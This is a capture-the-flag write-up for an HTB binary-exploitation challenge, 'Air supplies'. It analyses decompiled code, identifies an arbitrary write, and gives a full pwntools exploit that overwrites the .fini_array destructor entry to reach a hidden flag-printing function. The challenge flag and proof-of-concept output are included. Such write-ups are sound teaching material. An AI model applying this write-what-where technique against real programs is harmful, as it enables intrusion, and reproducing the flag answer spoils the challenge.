# Air supplies :small_airplane:

### Description: 

* Agent, you need to drop some supplies to a nearby villages in order to help our fellow allies and all innocent villagers. Make sure you know which supplies you need to drop and to which village each time! 

### Objective: 

* Take advantage of no `RELRO` and arbitrary `write` to overwrite .got entry of `'__do_global_dtors_aux_fini_array_entry'` and get a shell.

### Flag: :black_flag:

* `HTB{dr0p_1t_l1k3_1t5_h0t_4g3nt!}`

### Difficulty:
* Medium

### Challenge:

First of all, we start with a `checksec`:  

```gdb
gef➤  checksec 
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```

* `Canary`  and `NX` are **enabled**.
* `RELRO` and `PIE` are not.

That means that we can probably overwrite some addresses in the program.

The interface of the program looks like this:

```console
$ ./air_supplies 
Agent, are you informed about the mission?
1. No.
2. Yes, I am ready.
> 2
We are ready to proceed then!
Insert what kind of supply to drop: 1234
Insert location to drop: 56789
You did your best Agent, your mission here is over..
Segmentation fault (core dumped)
```

There is an interesting `SegFault`. Let's investigate this further.

### Disassembly :pick:

As always, starting from `main()`:

```c
undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  menu();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

There are 2 functions that are called:

* setup()
* **menu()**

The first one does not bother the user.

The second one is interesting.

`menu()`:

```c
void menu(void)

{
  long in_FS_OFFSET;
  int local_1c;
  char *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = "Agent, are you informed about the mission?\n1. No.\n2. Yes, I am ready.\n> ";
  w("Agent, are you informed about the mission?\n1. No.\n2. Yes, I am ready.\n> ");
  __isoc99_scanf(&DAT_00400e79,&local_1c);
  if ((local_1c == 1) || (local_1c == 2)) {
    choice(local_1c);
  }
  else {
    invalid();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

There are some functions:

* `w()`: just a short `write()`.
* `r()`: just a short `read()`.
* **`choice(arg)`**.
* `invalid()`.

`invalid()` just prints a message and exits (we have to avoid it).

```c
void invalid(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  fwrite(&DAT_00400ce8,1,0x14,stderr);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

#### Choice() :question:

```c
void choice(int param_1)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 == 1) {
    w("You must learn about your mission before you start!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x22);
  }
  w("We are ready to proceed then!\n");
  mission();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Now, there is only one function: `mission()`

```c
void mission(void)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  FILE *pFVar3;
  int extraout_EDX;
  int extraout_EDX_00;
  void *pvVar4;
  int in_R8D;
  int in_R9D;
  long in_FS_OFFSET;
  char local_24 [10];
  char local_1a [10];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  pvVar4 = (void *)0x1;
  pFVar3 = stderr;
  fwrite("Insert what kind of supply to drop: ",1,0x24,stderr);
  r(local_24,pvVar4,extraout_EDX,(char *)pFVar3,in_R8D,in_R9D);
  puVar1 = (ulonglong *)strtoull(local_24,(char **)0x0,0);
  pvVar4 = (void *)0x1;
  pFVar3 = stderr;
  fwrite("Insert location to drop: ",1,0x19,stderr);
  r(local_1a,pvVar4,extraout_EDX_00,(char *)pFVar3,in_R8D,in_R9D);
  fwrite("You did your best Agent, your mission here is over..\n",1,0x35,stderr);
  uVar2 = strtoull(local_1a,(char **)0x0,0);
  *puVar1 = uVar2;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

This function is a bit obfuscated. So, let's just focus on the important stuff.

We notice this:

```c
fwrite("Insert what kind of supply to drop: ",1,0x24,stderr);
r(local_24,pvVar4,extraout_EDX,(char *)pFVar3,in_R8D,in_R9D);
puVar1 = (ulonglong *)strtoull(local_24,(char **)0x0,0);
pvVar4 = (void *)0x1;
pFVar3 = stderr;
fwrite("Insert location to drop: ",1,0x19,stderr);
r(local_1a,pvVar4,extraout_EDX_00,(char *)pFVar3,in_R8D,in_R9D);
fwrite("You did your best Agent, your mission here is over..\n",1,0x35,stderr);
uVar2 = strtoull(local_1a,(char **)0x0,0);
*puVar1 = uVar2;
```

Whatever we insert as "supply", will be stored at `local_24` and after that, with `strtoull()` it will be converted and stored at: `puVar1`.

Following this, whatever we insert as "location",  will be stored at `local_1a` and after that, with `strtoull()` it will be converted and stored at: `uVar2`.

We have an arbitrary `write` wherever we want but, the problem is that the program `returns` and is terminated after that. There is `no call` to any other function. So, even though `RELRO` is disabled and we have an arbitrary write, there is no function that is useful for us to be overwritten.

#### "Hidden" function and __do_global_dtors :ghost:

There is a function that a few will not notice:

`_`:

```c
void _(void)

{
  long lVar1;
  size_t __n;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  __n = strlen("\nYou found the correct packet to drop Agent! Good job!\nHere is a gift for you: \n"
              );
  write(1,"\nYou found the correct packet to drop Agent! Good job!\nHere is a gift for you: \n",__n)
  ;
  system("cat flag*");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

This is the key function that prints the flag for us. So, this is **what** we want to write. Now, we need to find **where** we should write it.

Even though there is no call to any function after this, there is something that is called at the end of the program and these are the **Destructors**. This is what we are going to overwrite.

The address can be found easily with `pwntools`.

```python
fname = './air_supplies'
e = ELF(fname, checksec = False)
dtors = e.symbols['__do_global_dtors_aux_fini_array_entry']
```

### Exploit :scroll:

```python
#!/usr/bin/python3
from pwn import *

ip = '172.17.0.1'
port = 1337
fname = './air_supplies'

LOCAL = False # change this

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

e = ELF(fname, checksec = False)
ru = lambda x : r.recvuntil(x)
sl = lambda x : r.sendline(x)
sla = lambda x,y : r.sendlineafter(x,y)

def overwrite():
	# Get the address of "_" to overwrite __do_global_dtors_aux_fini_array_entry
	dtors = e.symbols['__do_global_dtors_aux_fini_array_entry']
	flag = e.symbols['_']
	sla(':', str(dtors))
	sla(':', str(flag))
	log.info('"__do_global_dtors_aux_fini_array_entry": 0x{:x}'.format(dtors))
	log.info('"_": 0x{:x}'.format(flag))
	log.info('Overwriting 0x{:x} with 0x{:x}..'.format(dtors, flag))
	ru('HTB')
	fl = ru('}')
	log.success('Flag: HTB' + fl.decode())

def pwn():
	sla('>', '2')
	overwrite()
	
if __name__ == '__main__':
	pwn()
```

### PoC: :checkered_flag:

```console
$ ./solver.py 
[+] Opening connection to 172.17.0.1 on port 1337: Done
[*] "__do_global_dtors_aux_fini_array_entry": 0x601100
[*] "_": 0x40096f
[*] Overwriting 0x601100 with 0x40096f..
[+] Flag: HTB{dr0p_1t_l1k3_1t5_h0t_4g3nt!}
```

This can be done without a script as long as we have the right values:

```console
$ ./air_supplies 
Agent, are you informed about the mission?
1. No.
2. Yes, I am ready.
> 2
We are ready to proceed then!
Insert what kind of supply to drop: 6295808
Insert location to drop: 4196719
You did your best Agent, your mission here is over..

You found the correct packet to drop Agent! Good job!
Here is a gift for you: 
HTB{dr0p_1t_l1k3_1t5_h0t_4g3nt!}
```
